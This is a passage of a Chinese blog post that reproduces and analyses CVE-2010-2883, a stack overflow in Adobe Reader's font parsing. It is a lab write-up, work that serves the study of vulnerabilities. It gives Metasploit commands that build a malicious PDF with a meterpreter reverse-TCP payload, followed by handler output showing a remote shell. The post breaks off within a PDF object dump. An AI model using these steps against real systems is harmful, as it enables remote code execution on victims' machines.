<!DOCTYPE html>
<html lang="zh-Hans">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->


<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="Sp4n9x" />
<meta name="renderer" content="webkit">
<meta name="google" value="notranslate">



<meta name="description" content="1、这个漏洞是《漏洞战争》中的例子，也要学着去分析分析实际的漏洞了。2、CVE-2010-2883是Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞。3、用户受骗打开了特制的PDF文件就有可能导致执行任意代码。  更新：2020.10.6,也算是重新分析了一遍吧,又收获了很多。这次分析,主要修正了第一次分析">
<meta name="keywords" content="Stack Overflow,Windows,Adobe Reader,Pdf,FileFormat">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2010-2883复现与分析">
<meta property="og:url" content="http://sp4n9x.github.io/2018/06/01/CVE-2010-2883复现与分析/index.html">
<meta property="og:site_name" content="Sp4n9x&#39;s Blog">
<meta property="og:description" content="1、这个漏洞是《漏洞战争》中的例子，也要学着去分析分析实际的漏洞了。2、CVE-2010-2883是Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞。3、用户受骗打开了特制的PDF文件就有可能导致执行任意代码。  更新：2020.10.6,也算是重新分析了一遍吧,又收获了很多。这次分析,主要修正了第一次分析">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-06-01-00.jpg">
<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-06-01-01.jpg">
<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-06-01-02.jpg">
<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-06-01-04.png">
<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-06-01-03.png">
<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-06-01-05.jpg">
<meta property="og:updated_time" content="2021-09-02T08:21:36.545Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2010-2883复现与分析">
<meta name="twitter:description" content="1、这个漏洞是《漏洞战争》中的例子，也要学着去分析分析实际的漏洞了。2、CVE-2010-2883是Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞。3、用户受骗打开了特制的PDF文件就有可能导致执行任意代码。  更新：2020.10.6,也算是重新分析了一遍吧,又收获了很多。这次分析,主要修正了第一次分析">
<meta name="twitter:image" content="http://sp4n9x.github.io/resources/2018/2018-06-01-00.jpg">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternative" href="/atom.xml" title="Sp4n9x&#39;s Blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.ico">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>CVE-2010-2883复现与分析 | Sp4n9x&#39;s Blog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>





    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?48aad015dbbeb363812643fd03e528c5";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>


</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/avatar.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Sp4n9x</a></h1>
        </hgroup>

        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">留言板</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:sp4n9x@qq.com" title="Email"></a>
                            
                                <a class="fa 新浪微博" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
                            
                                <a class="fa GitHub" href="https://github.com/Sp4n9x" title="GitHub"></a>
                            
                                <a class="fa 知乎" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
                            
                                <a class="fa 网易云音乐" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
                            
                            <!--
                            <div id="music163player">
                                <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=250 height=86 src="//music.163.com/outchain/player?type=2&id=535693399&auto=1&height=66">
                                </iframe>
                            </div>
                            -->
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AVI/">AVI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Adobe-Reader/">Adobe Reader</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cinepak/">Cinepak</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS隐蔽信道通信/">DNS隐蔽信道通信</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ELF/">ELF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FileFormat/">FileFormat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Got表覆写/">Got表覆写</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Heap/">Heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Heap-Overflow/">Heap Overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFH/">LFH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Microsoft-Office/">Microsoft Office</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PEB/">PEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pdf/">Pdf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rtf/">Rtf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SEH/">SEH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack-Overflow/">Stack Overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TEB/">TEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ubuntu/">Ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="//moxfive.xyz/">MOxFIVE</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">Sp4n9x&#39;s 简介</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Sp4n9x</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/avatar.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Sp4n9x</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">留言板</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:sp4n9x@qq.com" title="Email"></a>
                            
                                <a class="fa 新浪微博" target="_blank" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/Sp4n9x" title="GitHub"></a>
                            
                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
                            
                                <a class="fa 网易云音乐" target="_blank" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-CVE-2010-2883复现与分析" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/06/01/CVE-2010-2883复现与分析/" class="article-date">
      <time datetime="2018-05-31T16:00:00.000Z" itemprop="datePublished">2018-06-01</time>
</a>

 
    <a href="/2018/06/01/CVE-2010-2883复现与分析/#comments" title="查看评论">
        <i class="fa fa-comments-o" aria-hidden="true"></i>
        <span class="count-comment"></span>
        
        
            <span class="disqus-comment-count" data-disqus-identifier="2018/06/01/CVE-2010-2883复现与分析/"></span>
        
    </a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      CVE-2010-2883复现与分析
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/CVE/">CVE</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Adobe-Reader/">Adobe Reader</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/FileFormat/">FileFormat</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pdf/">Pdf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Stack-Overflow/">Stack Overflow</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
      
          
        <blockquote>
<p>1、这个漏洞是《漏洞战争》中的例子，也要学着去分析分析实际的漏洞了。<br>2、CVE-2010-2883是Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞。<br>3、用户受骗打开了特制的PDF文件就有可能导致执行任意代码。</p>
<ul>
<li>更新：2020.10.6,也算是重新分析了一遍吧,又收获了很多。这次分析,主要修正了第一次分析中的错误和不足。文章结构有较大变化。更新了动态调试部分，漏洞利用触发的具体原因，以及漏洞利用的具体细节。</li>
</ul>
<a id="more"></a>
</blockquote>
<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>&emsp;&emsp;<strong><code>Adobe Reader</code></strong>和<strong><code>Acrobat</code></strong>都是美国奥多比（Adobe）公司的产品。Adobe Reader是一款免费的<code>PDF文件阅读器</code>，Acrobat是一款<code>PDF文件编辑和转换工具</code>。基于<strong><code>Window</code></strong>和<strong><code>Mac OS X</code></strong>的Adobe Reader和Acrobat <code>9.4之前</code>的9.x版本，<code>8.2.5之前</code>的8.x版本的<code>CoolType.dll</code>中存在<code>基于栈的缓冲区溢出漏洞</code>。远程攻击者可借助带有<code>TTF字体</code>Smart INdependent Glyphlets (<code>SING</code>)表格中超长字段<code>uniqueName</code>的PDF文件<code>执行任意代码</code>或者导致<code>拒绝服务</code>（应用程序崩溃）。</p>
<h2 id="0x10-分析环境"><a href="#0x10-分析环境" class="headerlink" title="0x10 分析环境"></a>0x10 分析环境</h2><table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:left">使用的环境</th>
<th style="text-align:left">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">操作系统</td>
<td style="text-align:left">Windows XP Professional SP3</td>
<td style="text-align:left">简体中文版</td>
</tr>
<tr>
<td style="text-align:center">虚拟机</td>
<td style="text-align:left">VMware Workstation Pro</td>
<td style="text-align:left">版本号:12.5.8</td>
</tr>
<tr>
<td style="text-align:center">调试器</td>
<td style="text-align:left">OllyDbg</td>
<td style="text-align:left">吾爱破解OllyDbg</td>
</tr>
<tr>
<td style="text-align:center">反汇编器</td>
<td style="text-align:left">IDA Pro</td>
<td style="text-align:left">版本号:7.0</td>
</tr>
<tr>
<td style="text-align:center">漏洞软件</td>
<td style="text-align:left">Adobe Reader</td>
<td style="text-align:left">版本号:9.3.4</td>
</tr>
</tbody>
</table>
<h2 id="0x20-漏洞复现"><a href="#0x20-漏洞复现" class="headerlink" title="0x20 漏洞复现"></a>0x20 漏洞复现</h2><p>这里用<code>msf</code>来生成用于漏洞利用的<code>exploit样本</code>文件。</p>
<h3 id="0x21-生成exploit样本文件"><a href="#0x21-生成exploit样本文件" class="headerlink" title="0x21 生成exploit样本文件"></a>0x21 生成exploit样本文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1、弹出计算器</span><br><span class="line">msf &gt; search cve-2010-2883</span><br><span class="line">msf &gt; use exploit/windows/fileformat/adobe_cooltype_sing</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> FILENAME CVE-2010-2883(calc).pdf</span><br><span class="line">FILENAME =&gt; CVE-2010-2883(calc).pdf</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> payload windows/<span class="built_in">exec</span> </span><br><span class="line">payload =&gt; windows/<span class="built_in">exec</span></span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> CMD calc.exe</span><br><span class="line">CMD =&gt; calc.exe</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; run</span><br><span class="line">[*] Creating <span class="string">'CVE-2010-2883(calc).pdf'</span> file...</span><br><span class="line">[+] CVE-2010-2883(calc).pdf stored at /root/.msf4/<span class="built_in">local</span>/CVE-2010-2883(calc).pdf</span><br><span class="line"></span><br><span class="line">2、反弹Shell</span><br><span class="line">msf &gt; search cve-2010-2883</span><br><span class="line">msf &gt; use exploit/windows/fileformat/adobe_cooltype_sing</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> FILENAME CVE-2010-2883(shell).pdf</span><br><span class="line">FILENAME =&gt; CVE-2010-2883.pdf</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> LHOST 192.168.50.131</span><br><span class="line">LHOST =&gt; 192.168.50.131</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; run</span><br><span class="line">[*] Creating <span class="string">'CVE-2010-2883(shell).pdf'</span> file...</span><br><span class="line">[+] CVE-2010-2883(shell).pdf stored at /root/.msf4/<span class="built_in">local</span>/CVE-2010-2883(shell).pdf</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;执行完上面的命令可以在<code>/root/.msf4/local/</code>下找到用于exploit的样本文件。然后将样本文件复制到目标主机中。再在<code>kali</code>下进行监听，在windows XP SP3下通过Adobe Reader打开CVE-2010-2883(shell).pdf,获得<code>meterpreter session</code>,从而获得shell。</p>
<h3 id="0x22-反弹shell"><a href="#0x22-反弹shell" class="headerlink" title="0x22 反弹shell"></a>0x22 反弹shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; back</span><br><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.50.131</span><br><span class="line">LHOST =&gt; 192.168.50.131</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 192.168.50.131:4444 </span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.50.130</span><br><span class="line">[*] Meterpreter session 7 opened (192.168.50.131:4444 -&gt; 192.168.50.130:1074) at 2018-09-17 16:42:44 +0800</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3156 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows XP [版本 5.1.2600]</span><br><span class="line">(C) 版权所有 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\*******\桌面&gt;</span><br></pre></td></tr></table></figure>
<h2 id="0x30-漏洞原理分析"><a href="#0x30-漏洞原理分析" class="headerlink" title="0x30 漏洞原理分析"></a>0x30 漏洞原理分析</h2><h3 id="0x31-PDF文件格式"><a href="#0x31-PDF文件格式" class="headerlink" title="0x31 PDF文件格式"></a>0x31 PDF文件格式</h3><p>&emsp;&emsp;<code>可移植文档格式</code>（Portable Document Format，简称PDF）是一种用独立于应用程序、硬件、操作系统的方式呈现文档的文件格式。1991年，Adobe Systems共同创始人<code>约翰·沃诺克</code>提出的名为<code>“Camelot”</code>的系统演变成<code>PDF</code>。PDF文件格式可以将文字、字型、格式、颜色及独立于设备和分辨率的图形图像等封装在一个文件中。该格式文件还可以包含超文本链接、声音和动态影像等电子信息，支持特长文件，集成度和安全可靠性都较高。而且这种格式是<code>跨平台</code>的，和操作系统无关。<br>&emsp;&emsp;PDF文档是一种<code>文本</code>和<code>二进制</code>混排的格式，它由以下<strong><code>四部分组成</code></strong>：</p>
<blockquote>
<ul>
<li><strong><code>header</code></strong>：头部，PDF文件的第一行，用以标识PDF文档的版本。通常格式为%PDF-x.y,PDF版本历经了1.0、1.1、1.2、1.3、1.4、1.5、1.6、1.7、2.0多个版本。</li>
<li><strong><code>body</code></strong>：PDF的主体部分，包含PDF文档的主题内容，各部分以对象的方式呈现。</li>
<li><strong><code>xref table</code></strong>：交叉引用表，通过交叉引用表可以快速的找到PDF文档中的各对象。每一个对象在交叉引用表中占据一项。</li>
<li><strong><code>trailer</code></strong>：PDF文档尾，包含交叉引用的摘要和交叉引用表的起始位置。</li>
</ul>
</blockquote>
<p>&emsp;&emsp;PDF文档中包含<code>字体对象</code>，而本篇文章所讲述的漏洞就是发生在PDF阅读器对于字体解析过程中，未对字体对象中所包含的<code>SING表</code>的<code>uniqueName字段</code>进行长度校验，导致了<code>栈溢出</code>漏洞的发生。下面是我通过<code>PdfStreamDumper</code>读出来的一些PDF的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line">%PDF-1.5    //此PDF文档符合PDF1.5规范</span><br><span class="line">%84 DA C7 95    </span><br><span class="line"></span><br><span class="line">1 0 obj     //对象1</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Pages 2 0 R        </span><br><span class="line">    /Type /Catalog      //此对象是catalog对象</span><br><span class="line">    /OpenAction 11 0 R  //对象11包含打开PDF时要执行的操作</span><br><span class="line">    /AcroForm 13 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">2 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /MediaBox 3 0 R     //对象3包含页面显示的大小</span><br><span class="line">    /Resources 4 0 R    //对象4包含该页所要包含的资源，包括字体和内容的类型</span><br><span class="line">    /Kids [5 0 R]       //此对象的孩子为对象5</span><br><span class="line">    /Count 1            //此PDF总共有1页</span><br><span class="line">    /Type /Pages        //此对象是Pages对象</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">3 0 obj</span><br><span class="line">    [0 0 595 842]</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">4 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Font 6 0 R         //对象6包含字体相关信息</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">5 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Parent 2 0 R       //此对象的父对象是2</span><br><span class="line">    /MediaBox 3 0 R     //对象3包含页面显示的大小</span><br><span class="line">    /Resources 4 0 R    //对象4包含该页所要包含的资源，包括字体和内容的类型</span><br><span class="line">    /Contents [8 0 R]   //对象8是内容对象</span><br><span class="line">    /Type /Page         //此对象的类型是Page</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">6 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /F1 7 0 R           //对象7包含字体相关信息</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">7 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Font         //字体对象</span><br><span class="line">    /Subtype /TrueType  //字体类型是TrueType</span><br><span class="line">    /Name /F1</span><br><span class="line">    /BaseFont /Cinema   //基于Cinema字体</span><br><span class="line">    /Widths []</span><br><span class="line">    /FontDescriptor 9 0 R   //对象9是字体描述对象</span><br><span class="line">    /Encoding /MacRomanEncoding     //字符编码采用MacRoman</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span 